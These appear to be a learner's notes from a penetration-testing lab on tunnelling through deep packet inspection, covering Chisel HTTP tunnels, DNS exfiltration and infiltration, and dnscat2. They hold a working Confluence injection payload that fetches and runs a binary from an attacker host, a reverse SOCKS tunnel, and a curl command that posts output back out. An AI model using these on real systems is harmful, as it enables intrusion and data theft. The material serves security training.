# Tunneling Through Deep Packet Inspection
_Deep packet inspection_ is a technology that's implemented to monitor traffic based on a set of rules
+ It's most often used on a network perimeter, where it can highlight patterns that are indicative of compromise

Deep packet inspection devices may be configured to only allow specific transport protocols into, out of, or across the network
+ For example, a network administrator could create a rule that terminates any outbound SSH traffic
+ If they implemented that rule, all connections that use SSH for transport would fail, including any SSH port redirection and tunneling strategies we had implemented

Given the variety of restrictions that may be implemented on a network, we need to learn and leverage a number of different tunneling tools and strategies to successfully bypass technologies like deep packet inspection

## HTTP Tunneling Theory and Practice

### HTTP Tunneling Fundamentals
Let's begin our exploration of HTTP tunneling by introducing a simple scenario
+ In this case, we have compromised `CONFLUENCE01`, and can execute commands via HTTP requests
+ However, once we try to pivot, we are blocked by a considerably restrictive network configuration

Specifically, a _Deep Packet Inspection_ (DPI) solution is now terminating all outbound traffic except HTTP
+ In addition, all inbound ports on `CONFLUENCE01` are blocked except TCP/8090
+ We can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution
+ We also can't create an SSH remote port forward for the same reason
+ The only traffic that will reach our Kali machine is HTTP, so we could, for example, make requests with _Wget_ and _cURL_

**NOTE**: This is a hypothetical scenario: we haven't actually implemented any deep packet inspection in the exercise lab! But imagining these restrictions can help us develop robust tunneling strategies

The network configuration for this scenario is shown in the following diagram:
![[Pasted image 20231216131317.png]]

In this case, the FIREWALL/INSPECTOR device has replaced the previous simple firewall
+ In addition, `MULTISERVER03` is blocked on the WAN interface
+ We have credentials for the `PGDATABASE01` server, but need to figure out how to SSH directly there through `CONFLUENCE01` 
+ We need a tunnel into the internal network, but it must resemble an outgoing HTTP connection from `CONFLUENCE01`
### HTTP Tunneling with Chisel 
The above is a perfect scenario for _Chisel_, an HTTP tunneling tool that encapsulates our data stream within HTTP
+ It also uses the SSH protocol within the tunnel so our data will be encrypted

Chisel uses a client/server model
+ A _Chisel server_ must be set up, which can accept a connection from the _Chisel client_
+ Various port forwarding options are available depending on the server and client configurations
+ One option that is particularly useful for us is _reverse port forwarding_, which is similar to SSH remote port forwarding
+ Chisel can run on _macOS_, _Linux_, and _Windows_, and on various architectures on each.
+ Older tools like _HTTPTunnel_ offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel

Now that we know what Chisel is capable of, we can make a plan
+ We will run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on `CONFLUENCE01`
+ Chisel will bind a SOCKS proxy port on the Kali machine
+ The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted
+ The Chisel client will then decapsulate it and push it wherever it is addressed
+ When running, it should look somewhat like the following diagram:
![[Pasted image 20231216131721.png]]

The traffic between the Chisel client and server is all HTTP-formatted
+ This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet
+ The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port
+ All traffic sent to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded wherever it's addressed

Let's get the Chisel server up and running on our Kali machine. In the usage guide, we find the **--reverse** flag
+ Starting the Chisel server with this flag will mean that when the client connects, a SOCKS proxy port will be bound on the server

Before we start the server, we should copy the Chisel client binary to `CONFLUENCE01`
+ The Chisel server and client are actually run from the same binary, they're just initialized with either _server_ or _client_ as the first argument
+ If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page

In this case, both `CONFLUENCE01` and our Kali machine are _amd64_ Linux machines
+ That means we can try to run the same **chisel** binary we have on our Kali machine on `CONFLUENCE01`
+ To get the Chisel binary onto `CONFLUENCE01`, we can leverage the injection to download it from our Kali machine over HTTP
+ We can serve the **chisel** binary using Apache
+ In order to do this, we must first copy the Chisel binary to our Apache2 server's webroot directory:
```
sudo cp $(which chisel) /var/www/html/
```

We can then make sure that Apache2 is started on our Kali machine using **systemctl**:
```
sudo systemctl start apache2
```

Next, we will build the **wget** command we want to run through the injection on `CONFLUENCE01`
+ This command will download the **chisel** binary to **/tmp/chisel** and make it executable:
```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Next, we'll format this command to work with our **curl** Confluence injection payload:
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
+ See the command with URL Decode:
```
curl http://192.168.50.63:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel').start()")}/
```

The Apache2 log file (**/var/log/apache2/access.log**) eventually shows the request for the Chisel binary coming in:
```
kali@kali:~$ tail -f /var/log/apache2/access.log
...
192.168.50.63 - - [03/Oct/2023:15:53:16 -0400] "GET /chisel HTTP/1.1" 200 8593795 "-" "Wget/1.20.3 (linux-gnu)"
```

Now that we have the Chisel binary on both our Kali machine and the target, we can run them
+ On the Kali machine, we'll start the binary as a server with the **server** subcommand, along with the bind port (**--port**) and the **--reverse** flag to allow the reverse port forward
```
chisel server --port <BIND-PORT> --reverse
```
+ Example usage and output:
```
kali@kali:~$ chisel server --port 8080 --reverse
2023/10/03 15:57:53 server: Reverse tunnelling enabled
2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
```
+ The Chisel server starts up and confirms that it is listening on port 8080, and has reverse tunneling enabled


Before we try to run the Chisel client, we'll run **tcpdump** on our Kali machine to log incoming traffic. 
+ We'll start the capture filtering to **tcp port 8080** to only capture traffic on TCP port 8080:
```
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Next, we'll try to start the Chisel client using the injection, applying the server address and the port forwarding configuration options on the command line
+ We want to connect to the server running on our Kali machine (**192.168.118.4:8080**), creating a reverse SOCKS tunnel (**R:socks**)
+ The **R** prefix specifies a reverse tunnel using a **socks** proxy (which is bound to port **1080** by default)
+ The remaining shell redirections (**> /dev/null 2>&1 &**) force the process to run in the background, so our injection does not hang waiting for the process to finish
+ Usage:
```
/tmp/chisel client <SERVER-IP>:<SERVER-PORT> R:socks > /dev/null 2>&1 &
```

We'll convert this into a Confluence injection payload, and send it to `CONFLUENCE01`:
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

However, nothing happens. We don't see any traffic hit our Tcpdump session, and the Chisel server output doesn't show any activity
+ This indicates there may be something wrong with the way we're running the Chisel client process on `CONFLUENCE01`
+ However, we don't have direct access to the error output when running the binary. 
	+ We need to figure out a way to read the command output
+ which may be able to point us towards the problem. We should then be able to solve it

To read the command output, we can construct a command which redirects stdout and stderr output to a file, and then send the contents of that file over HTTP back to our Kali machine
+ We use the **&>** operator, which directs all streams to stdout, and write it to **/tmp/output**
+ We then run **curl** with the **--data** flag, telling it to read the file at **/tmp/output**, and POST it back to our Kali machine on port 8080
```
/tmp/chisel client <SERVER-IP>:<SERVER-PORT> R:socks &> /tmp/output; curl --data @/tmp/output http://<SERVER-IP>:<SERVER-PORT>/
```
+ We can then create an injection payload using this command string, and send it to the vulnerable Confluence instance:
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
```

On sending this new injection, we check Tcpdump output for attempted connections:
```
...
16:30:50.915895 IP (tos 0x0, ttl 61, id 47823, offset 0, flags [DF], proto TCP (6), length 410)
    192.168.50.63.50192 > 192.168.118.4.8080: Flags [P.], cksum 0x1535 (correct), seq 1:359, ack 1, win 502, options [nop,nop,TS val 391724691 ecr 3105669986], length 358: HTTP, length: 358
        POST / HTTP/1.1
        Host: 192.168.118.4:8080
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 204
        Content-Type: application/x-www-form-urlencoded

        /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
        0x0000:  4500 019a bacf 4000 3d06 f729 c0a8 db3f  E.....@.=..)...?
        0x0010:  c0a8 2dd4 c410 1f90 d15e 1b1b 2b88 002d  ..-......^..+..-
...
```
+ We get the output that running **/tmp/chisel** produces
+ Chisel is trying to use versions 2.32 and 2.34 of **glibc**, which the `CONFLUENCE01` server does not have
+ **NOTE**: This module is being written in 2023, using Chisel version _1.8.1-0kali2 (go1.20.7)_. The Kali repos will likely contains later versions of Chisel in the future, and the exact error message that comes back from these later versions of Chisel may be different. However, the same principle applies. We have encountered an error trying to run a payload on a target system. As such, we have to find an alternative payload which will run. Finding a way around these kinds of setbacks is an important skill which can be applied to many other situations where tool incompatibilities arise

This points towards a version incompatibility
+ When a version of a tool or component is more recent than the operating system it's trying to run on, there's a risk that the operating system will not contain the required technologies that the newer tool is expecting to be able to use
+ In this case, Chisel is expecting to use glibc version 2.32 or 2.34, neither of which can be found on `CONFLUENCE01`

To try to find a solution, let's first check the version information for the Chisel binary we have on Kali, which we are also trying to run on `CONFLUENCE01`:
```
kali@kali:~$ chisel -h

  Usage: chisel [command] [--help]

  Version: 1.8.1-0kali2 (go1.20.7)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

The version of Chisel that ships with this particular version of Kali is 1.8.1
+ However, there is another detail that's important here
+ It has been compiled with Go version 1.20.7

Some light web surfing reveals that similar messages appear when binaries compiled with Go versions 1.20 and later are run on operating systems that don't have a compatible version of glibc
+ On the Chisel Github page, we find an "official" compiled binary, also version 1.81, is compiled with Go version 1.19. Version 1.19 is one version of Go lower than the version that seems to have introduced this glibc incompatibility
+ With that in mind, we can try using the Go 1.19-compiled Chisel 1.81 binary for Linux on amd64 processors. This is available on the main Chisel Github

We can first download the gzipped binary from Github using **wget**
```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
```
+ We can unpack that using **gunzip**, then copy it over to the **/var/www/html/** folder so we can serve it using Apache:
```
gunzip chisel_1.8.1_linux_amd64.gz
```
+ Then can move it to the web server
```
sudo cp ./chisel /var/www/html
```

This will overwrite the copy of Chisel we had already copied into the Apache web root directory
+ We can then just run the same Wget injection as we did before, to force the CONFLUENCE01 server to download the Chisel binary and write it to /tmp/chisel:
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

We can then try to run the Chisel client again on CONFLUENCE01 using the injection:
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

This time, different kind of traffic is logged in our Tcpdump session
```
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6), length 276)
    192.168.50.63.41424 > 192.168.118.4.8080: Flags [P.], cksum 0xce2b (correct), seq 1:225, ack 1, win 502, options [nop,nop,TS val 1290578437 ecr 143035602], length 224: HTTP, length: 224
        GET / HTTP/1.1
        Host: 192.168.118.4:8080
        User-Agent: Go-http-client/1.1
        Connection: Upgrade
        Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
        Sec-WebSocket-Protocol: chisel-v3
        Sec-WebSocket-Version: 13
        Upgrade: websocket

        0x0000:  4500 0114 d200 4000 3f06 3f4f c0a8 323f  E.....@.?.?O..2?
        0x0010:  c0a8 7604 a1d0 1f90 61a9 fe5d 2446 312e  ..v.....a..]$F1.
        0x0020:  8018 01f6 ce2b 0000 0101 080a 4cec aa05  .....+......L...
        0x0030:  0886 8cd2 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
        0x0040:  2e31 0d0a 486f 7374 3a20 3139 322e 3136  .1..Host:.192.16
        0x0050:  382e 3131 382e 343a 3830 3830 0d0a 5573  8.118.4:8080..Us
        0x0060:  6572 2d41 6765 6e74 3a20 476f 2d68 7474  er-Agent:.Go-htt
        0x0070:  702d 636c 6965 6e74 2f31 2e31 0d0a 436f  p-client/1.1..Co
        0x0080:  6e6e 6563 7469 6f6e 3a20 5570 6772 6164  nnection:.Upgrad
        0x0090:  650d 0a53 6563 2d57 6562 536f 636b 6574  e..Sec-WebSocket
        0x00a0:  2d4b 6579 3a20 4c38 4643 744c 334d 5731  -Key:.L8FCtL3MW1
        0x00b0:  3867 4864 2f63 6352 574f 5051 3d3d 0d0a  8gHd/ccRWOPQ==..
        0x00c0:  5365 632d 5765 6253 6f63 6b65 742d 5072  Sec-WebSocket-Pr
        0x00d0:  6f74 6f63 6f6c 3a20 6368 6973 656c 2d76  otocol:.chisel-v
        0x00e0:  330d 0a53 6563 2d57 6562 536f 636b 6574  3..Sec-WebSocket
        0x00f0:  2d56 6572 7369 6f6e 3a20 3133 0d0a 5570  -Version:.13..Up
        0x0100:  6772 6164 653a 2077 6562 736f 636b 6574  grade:.websocket
        0x0110:  0d0a 0d0a                                ....
18:13:53.687745 IP (tos 0x0, ttl 64, id 60604, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq 1, ack 225, win 508, options [nop,nop,TS ...
...
```

The traffic that Tcpdump has logged indicates that the Chisel client has created an HTTP WebSocket connection with the server running on out Kali machine
+ On top of this, our Chisel server has logged an inbound connection:
```
kali@kali:~$ chisel server --port 8080 --reverse
2023/10/03 15:57:53 server: Reverse tunnelling enabled
2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
2023/10/03 18:13:54 server: session#2: Client version (1.8.1) differs from server version (1.8.1-0kali2)
2023/10/03 18:13:54 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now, we can check the status of our SOCKS proxy with **ss**:
```
ss -ntplu
```
+ Example output:
```
Netid     State      Recv-Q     Send-Q           Local Address:Port            Peer Address:Port     Process
udp       UNCONN     0          0                      0.0.0.0:34877                0.0.0.0:*
tcp       LISTEN     0          4096                 127.0.0.1:1080                 0.0.0.0:*         users:(("chisel",pid=501221,fd=8))
tcp       LISTEN     0          4096                         *:8080                       *:*         users:(("chisel",pid=501221,fd=6))
tcp       LISTEN     0          511                          *:80                         *:*
```
+ Our SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine

Let's use this to connect to the SSH server on `PGDATABASE01`
+ In _Port Redirection and SSH Tunneling_, we created SOCKS proxy ports with both SSH remote and classic dynamic port forwarding, and used Proxychains to push non-SOCKS-native tools through the tunnel
+ But we've not yet actually run SSH itself through a SOCKS proxy

SSH doesn't offer a generic SOCKS proxy command-line option
+ Instead, it offers the _ProxyCommand_ configuration option. We can either write this into a configuration file, or pass it as part of the command line with **-o**

ProxyCommand accepts a shell command that is used to open a proxy-enabled channel
+ The documentation suggests using the _OpenBSD_ version of Netcat, which exposes the _-X_ flag and can connect to a SOCKS or HTTP proxy
+ However, the version of Netcat that ships with Kali doesn't support proxying

Instead, we'll use _Ncat_, the Netcat alternative written by the maintainers of Nmap
+ We can install this on Kali with **`sudo apt install ncat`**

Now we'll pass an Ncat command to **ProxyCommand**
+ The command we construct tells Ncat to use the **socks5** protocol and the proxy socket at **127.0.0.1:1080**
+ The **%h** and **%p** tokens represent the SSH command host and port values, which SSH will fill in before running the command
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
+ Very nice! We gained access to the SSH server, through our Chisel reverse SOCKS proxy, tunneling traffic through a reverse HTTP tunnel

## DNS Tunneling Theory and Practice
DNS is one of the foundational Internet protocols and has been abused by attackers for various nefarious purposes
+ For example, it can serve as a mechanism to tunnel data _indirectly_ in and out of restrictive network environments
+ To understand exactly how this works, let's present a simplified "crash course" in DNS
+ We will then learn how to perform DNS tunneling with a tool called _dnscat2_

### DNS Tunneling Fundamentals
IP addresses, not human-readable names, are used to route Internet data
+ Whenever we want to access a domain by its domain name, we need first obtain its IP address
+ To retrieve (or _resolve_) the IP address of a human-readable address, we need to ask various DNS servers
+ Let's walk through the process of resolving the IPv4 address of "`www.example.com`"

In most cases, we'll ask a DNS _recursive resolver_ server for the DNS _address record_ (_A_ record) of the domain
+ An _A record_ is a DNS data type that contains an IPv4 address
+ The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us

Once it retrieves the request from us, the recursive resolver starts making queries
+ It holds a list of _root name servers_ (as of 2022, there are _13_ of them scattered around the world)
+ Its first task is to send a DNS query to one of these root name servers
+ Because **example.com** has the ".com" suffix, the root name server will respond with the address of a DNS name server that's responsible for the _.com_ _top-level domain_ (TLD)
+ This is known as the _TLD name server_

The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for **example.com**
+ The TLD name server will respond with the _authoritative name server_ for the **example.com** domain
+ The recursive resolver then asks the **example.com** authoritative name server for the IPv4 address of `www.example.com`
+ The **example.com** authoritative name server replies with the A record for that

The recursive resolver then returns that to us
+ All these requests and responses are transported over UDP, with UDP/53 being the standard DNS port

In our lab network, with `MULTISERVER03` as the DNS server, a request from `PGDATABASE01` for the IP address of `www.example.com` would follow the flow shown below
+ The firewalls have been removed from this diagram for simplicity:
![[Pasted image 20231216143251.png]]
+ It's common to use the recursive resolver provided by an ISP (which is usually pre-programmed into the stock ISP router), but other well-known _public recursive name servers_ can be used as well. For example, _Google_ has a public DNS server at 8.8.8.8.

Let's try this out in a new scenario in the lab, which is configured precisely for this purpose
+ In this scenario, we have a new server: `FELINEAUTHORITY`
+ This server is situated on the WAN alongside our Kali machine
+ This means that `MULTISERVER03`, `CONFLUENCE01`, and our Kali machine can route to it, but `PGDATABASE01` and `HRSHARES` cannot

`FELINEAUTHORITY` is registered within this network as the authoritative name server for the **feline.corp** zone
+ We will use it to observe how DNS packets reach an authoritative name server
+ In particular, we will watch DNS packets being exchanged between `PGDATABASE01` and `FELINEAUTHORITY`

While `PGDATABASE01` cannot connect directly to `FELINEAUTHORITY`, it can connect to `MULTISERVER03`
+ `MULTISERVER03` is also configured as the DNS resolver server for `PGDATABASE01`
![[Pasted image 20231216143523.png]]
+ In the real world, we will have registered the feline.corp domain name ourselves, set up the authoritative name server machine ourselves, and told the domain registrar that this server should be known as the authoritative name server for the feline.corp zone. However, for simplicity in this lab environment, `FELINEAUTHORITY` is provided pre-configured. In a real deployment, we would need to configure the server and take care of all other peripheral registrations to ensure that any other DNS servers would eventually find our server for all feline.corp requests.

In order to see how DNS requests will be relayed to `FELINEAUTHORITY` from `PGDATABASE01`, we need to initiate DNS requests from `PGDATABASE01`, and monitor what comes in to `FELINEAUTHORITY`
+ For that reason, we need a shell on each of these machines

As in previous examples, we can only access `PGDATABASE01` through `CONFLUENCE01`
+ So in order to connect to the SSH server on `PGDATABASE01`, we must pivot through `CONFLUENCE01`
+ We'll compromise `CONFLUENCE01` by exploiting CVE-2022-26134 with our reverse shell payload, and create an SSH remote port forward to relay a port on our Kali machine to the SSH service on `PGDATABASE01`
+ Will then SSH into PGDATABASE01 as the _database_admin_ user

Since `FELINEAUTHORITY` is also on the WAN, we can SSH directly into `FELINEAUTHORITY` using the username _kali_ and the password _`7he_C4t_c0ntro11er`_
+ We now have two open shells:
	+ The first is on `PGDATABASE01` as the _database_admin_ user
	+ The second is on `FELINEAUTHORITY` as the _kali_ user

In order to simulate a real DNS setup, we can make `FELINEAUTHORITY` a functional DNS server using _Dnsmasq_
+ Dnsmasq is DNS server software that requires minimal configuration
+ A few Dnsmasq configuration files are stored in the **~/dns_tunneling** folder, which we'll use as part of our DNS experiments
+ For this initial experiment, we'll use the very sparse **dnsmasq.conf** configuration file
```
kali@felineauthority:~$ cd dns_tunneling

kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

This configuration ignores the **/etc/resolv.conf** and **/etc/hosts** files and only defines the _auth-zone_ and _auth-server_ variables 
+ These tell Dnsmasq to act as the authoritative name server for the **feline.corp** zone
+ We have not configured any records so far
+ Requests for anything on the feline.corp domain will return failure responses
+ Now that the configuration is set, we'll start the **dnsmasq** process with the **dnsmasq.conf** configuration file (**-C**), making sure it runs in "no daemon" (**-d**) mode so it runs in the foreground
+ We can kill it easily again later
```
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
```

In another shell on `FELINEAUTHORITY`, we'll set up tcpdump to listen on the **ens192** interface for DNS packets on UDP/53, using the capture filter **udp port 53**:
```
sudo tcpdump -i ens192 udp port 53
```

Now that tcpdump is listening and Dnsmasq is running on `FELINEAUTHORITY`, we will move to our shell on `PGDATABASE01`
+ From there we will make DNS queries aimed at the **feline.corp** domain
+ First let's confirm `PGDATABASE01`'s DNS settings
+ Since DNS resolution is handled by systemd-resolved we can check the DNS settings using the **resolvectl** utility
```
database_admin@pgdatabase01:~$ resolvectl status
...             

Link 5 (ens224)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64

Link 4 (ens192)
      Current Scopes: DNS        
DefaultRoute setting: yes        
       LLMNR setting: yes        
MulticastDNS setting: no         
  DNSOverTLS setting: no         
      DNSSEC setting: no         
    DNSSEC supported: no         
  Current DNS Server: 10.4.50.64
         DNS Servers: 10.4.50.64
```

`PGDATABASE01`'s DNS server is set to 10.4.50.64 (`MULTISERVER03`)
+ It will query `MULTISERVER03` any time it needs a domain name resolved
+ But `PGDATABASE01` has no outgoing network connectivity, so it can't communicate directory with FELINEAUTHORITY or our Kali machine
+ As an experiment, let's use **nslookup** to make a DNS request for **exfiltrated-data.feline.com**
```
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

This returns an _NXDOMAIN_ response that indicates the DNS request failed
+ This is expected though, as we haven't configured our DNS server to actually serve any records
+ nslookup used the DNS server running on the localhost interface of `127.0.0.53`. This is normal as it's the DNS resolver provided by the _systemd-resolved_ service running on Ubuntu. It will forward the query to the DNS server that's configured by _Netplan_. However, it may cache results. If we receive outdated DNS responses, we should try flushing the local DNS cache with **resolvectl flush-caches**. We can also query the DNS server directly by appending the serve address to the nslookup command. For example: **nslookup exfiltrated-data.feline.corp 192.168.50.64**.

The tcpdump program on `FELINEAUTHORITY` captured DNS packets from `MULTISERVER03`:
```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1 (57)
```

In this case, we've received a DNS A record request for **exfiltrated-data.feline.corp** on `FELINEAUTHORITY`
+ This happened because `MULTISERVER03` determined the authoritative name server for the **feline.corp** zone
+ All requests for _any_ subdomain of **feline.corp** will be forwarded to `FELINEAUTHORITY`
+ We didn't tell Dnsmasq on `FELINEAUTHORITY` what to do with requests for **exfiltrated-data.feline.corp**, so Dnsmasq just returned an _NXDomain__ response
+ We can see this flow in the following diagram:
![[Pasted image 20231216144436.png]]

The steps where `MULTISERVER03` sent queries to the root name servers and TLD name server have been omitted here for simplicity
+ But in a normal network situation, these steps would precede the request made to `FELINEAUTHORITY`

An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its way to an external server we control
+ This may seem subtle, but it illustrates that we can transfer small amounts of information (exfiltrated data) from inside the network to the outside, without a direct connection, just by making DNS queries
+ Exfiltrating small chunks of plaintext data is one thing, but imagine we have a binary file we want to exfiltrate from `PGDATABASE01`. How might we do that?

This would require a series of sequential requests
+ We could convert a binary file into a long _hex_ string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for **[hex-string-chunk].feline.corp** 
+ On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary
+ We won't go into further details here, but this should clarify the general concept of DNS network exfiltration

Now that we have covered the process of exfiltrating data from a network, let's consider how we might _infiltrate_ data into a network
+ The DNS specification includes various _records_. We've been making _A record_ requests so far
+ An A record response contains an IPv4 address for the requested domain name

But there are other kinds of records, some of which we can use to smuggle arbitrary data _into_ a network
+ One of these is the _TXT record_
+ The TXT record is designed to be general-purpose, and contains "arbitrary string information".

We can serve TXT records from `FELINEAUTHORITY` using Dnsmasq
+ First, we'll kill our previous **dnsmasq** process with a Ctrl+c. 
+ Then we'll check the contents of **dnsmasq_txt.conf** and run **dnsmasq** again with this new configuration
```
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
```

The **dnsmasq_txt.conf** contains two extra lines starting with `txt-record=`
+ Each of these lines represents a TXT record that Dnsmasq will serve
+ Each contains the domain the TXT record is for, then an _arbitrary string attribute_, separated by a comma
+ From these two definitions, any TXT record requests for `www.feline.corp` should return the strings "here's something useful!" and "here's something else less useful.".

Let's test this hypothesis
+ Back on PGDATABASE01, we'll make a request for TXT records for `www.feline.corp` with **nslookup** by passing the **`-type=txt`** argument
```
nslookup -type=txt www.feline.corp
```
+ Example output:
```
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:

database_admin@pgdatabase01:~$
```
+ We received the _arbitrary string attributes_ that were defined in **dnsconfig_txt.conf**

This is one way to get data into an internal network using DNS records
+ If we wanted to infiltrate binary data, we could serve it as a series of _Base64_ or _ASCII hex encoded_ TXT records, and convert that back into binary on the internal server


### DNS Tunneling with dnscat2
We can use _dnscat2_ to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records
+ A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines

Let's try out dnscat2
+ We'll inspect traffic from `FELINEAUTHORITY` with **tcpdump**, filtering specifically on UDP port 53 (**udp port 53**).
```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

We'll kill our existing Dnsmasq process with a Ctrl+C and run **dnscat2-server** instead, passing the **feline.corp** domain as the only argument
+ Usage:
```
dnscat2-server <DOMAIN>
```
+ Example usage and output:
```
kali@felineauthority:~$ dnscat2-server feline.corp

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```
+ This indicates that the dnscat2 server is listening on all interfaces on UDP/53

